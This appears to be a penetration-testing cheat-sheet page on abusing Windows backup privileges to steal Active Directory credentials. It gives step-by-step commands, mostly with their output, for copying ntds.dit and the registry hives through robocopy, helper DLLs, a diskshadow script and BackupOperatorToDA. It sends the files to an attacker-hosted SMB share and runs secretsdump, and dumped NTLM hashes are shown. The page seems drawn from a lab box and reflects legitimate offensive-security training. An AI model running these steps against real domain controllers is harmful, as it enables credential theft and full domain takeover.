---
title: "SeBackupPrivilege/SeRestorePrivilege"
date: 2024-7-18
tags: ["Credential Dumping", "File System", "SeBackupPrivilege", "SeRestorePrivilege", "Windows", "Backup Operators", "Diskshadow"]
---

### Abuse #1: Robocopy

```console
# For example
robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE>
```

---

### Abuse #2: Helper dlls

```console
import-module .\SeBackupPrivilegeCmdLets.dll
```

```console
import-module .\SeBackupPrivilegeUtils.dll
```

```console
Copy-FileSeBackupPrivilege '<TARGET_FILE_PATH>' 'C:\ProgramData\<TARGET_FILE>'
```

```console
# For example
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
```

<small>*Ref: [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true)*</small>
<br>
<small>*Ref: [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true)*</small>

---

### Abuse #3: Diskshadow

#### 1. Create a .dsh File

```console
set context persistent nowriters
set metadata C:\ProgramData\test.cab
set verbose on
add volume c: alias test
create
expose %test% x:
```

<br>

```console
# Convert to dos format
unix2dos vss.dsh
```

#### 2. Run vss.dsh

```console
# Upload and run
diskshadow /s C:\ProgramData\vss.dsh
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s C:\ProgramData\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  9/24/2024 5:54:17 PM

-> set context persistent nowriters
-> set metadata c:\windows\tasks\test.cab
-> set verbose on
-> add volume c: alias test
-> create

Alias test for shadow ID {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {fa58db67-4686-4a2b-8f7e-2bc95503aa4a} set as environment variabl
Inserted file Manifest.xml into .cab file test.cab
Inserted file DisAF3.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {fa58db67-4686-4a2b-8f7e-2bc95503aa4a}

        * Shadow copy ID = {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491}               %test%
                - Shadow copy set: {fa58db67-4686-4a2b-8f7e-2bc95503aa4a}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 9/24/2024 5:54:18 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %test% x:
-> %test% = {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491}
The shadow copy was successfully exposed as x:\.
->
```

#### 3. Host a SMB Server (In Linux)

```console
impacket-smbserver share . -smb2support
```

```console {class="sample-code"}
$ impacket-smbserver share . -smb2support                                  
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
...[SNIP]...
```

#### 4. Copy to Local Linux

```console
net use \\<LOCAL_IP>\share
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc_backup\Documents> net use \\10.10.14.31\share
The command completed successfully.
```

```console
Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\<LOCAL_IP>\share\ntds.dit
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.31\share\ntds.dit
```

```console
reg.exe save hklm\system \\<LOCAL_IP>\share\system
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg.exe save hklm\system \\10.10.14.31\share\system
```

#### 5. Secrets Dump

```console
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

```console {class="sample-code"}
$ impacket-secretsdump -ntds ntds.dit -system system LOCAL
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
...[SNIP]...
[*] Cleaning up...
```

---

### Abuse #4: BackupOperatorToDA

#### 1. Host a SMB Server (In Linux)

```console
impacket-smbserver share . -smb2support
```

#### 2. Copy Hives

```console
.\BackupOperatorToDA.exe -t \\<TARGET_COMPUTER> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -o \\<LOCAL_IP>\share\
```

```console {class="sample-code"}
PS C:\programdata> .\BackupOperatorToDA.exe -t \\DC01 -u user -p 'password' -d example.com -o \\10.10.14.2\share\
Making user token
Dumping SAM hive to \\10.10.14.2\share\SAM
Dumping SYSTEM hive to \\10.10.14.2\share\SYSTEM
Dumping SECURITY hive to \\10.10.14.2\share\SECURITY
```

#### 3. Secrets Dump

```console
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```